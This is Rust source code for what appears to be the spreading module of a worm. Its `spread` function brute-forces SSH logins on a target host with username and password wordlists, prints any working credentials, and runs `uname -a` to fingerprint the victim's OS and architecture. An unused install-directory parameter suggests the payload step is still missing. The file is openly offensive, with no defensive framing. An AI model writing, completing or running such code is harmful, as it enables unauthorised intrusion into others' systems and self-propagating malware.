use crate::wordlist;
use ssh2::{Channel, Session};
use std::{fmt, io::Read, net::TcpStream, path::PathBuf};

#[derive(Debug, Clone, Copy)]
enum Platform {
    LinuxX86_64,
    LinuxAarch64,
    MacOsX86_64,
    MacOsAarch64,
    Unknown,
}

impl fmt::Display for Platform {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{:?}", self)
    }
}

pub fn spread(install_dir: PathBuf, host_port: &str) -> Result<(), crate::Error> {
    let tcp = TcpStream::connect(host_port)?;
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;

    for username in wordlist::USERNAMES {
        for password in wordlist::PASSWORDS {
            let _ = sess.userauth_password(username, password);
            if sess.authenticated() {
                println!(
                    "Authenticated! username: ({}), password: ({})",
                    username, password
                );
                break;
            }
        }
    }

    let platform = identify_platform(&sess)?;

    println!("detected platform: {}", platform);

    Ok(())
}

fn identify_platform(ssh: &Session) -> Result<Platform, crate::Error> {
    let mut channel = ssh.channel_session()?;
    channel.exec("uname -a")?;

    let (stdout, _) = consume_stdio(&mut channel);
    let stdout = stdout.trim();

    if stdout.contains("Linux") {
        if stdout.contains("x86_64") {
            return Ok(Platform::LinuxX86_64);
        } else if stdout.contains("aarch64") {
            return Ok(Platform::LinuxAarch64);
        } else {
            return Ok(Platform::Unknown);
        }
    } else if stdout.contains("Darwin") {
        if stdout.contains("x86_64") {
            return Ok(Platform::MacOsX86_64);
        } else if stdout.contains("aarch64") {
            return Ok(Platform::MacOsAarch64);
        } else {
            return Ok(Platform::Unknown);
        }
    } else {
        return Ok(Platform::Unknown);
    }
}

fn consume_stdio(channel: &mut Channel) -> (String, String) {
    let mut stdout = String::new();
    channel.read_to_string(&mut stdout).unwrap();

    let mut stderr = String::new();
    channel.stderr().read_to_string(&mut stderr).unwrap();

    // eprintln!("stdout: {}", stdout);
    // eprintln!("stderr: {}", stderr);

    (stdout, stderr)
}
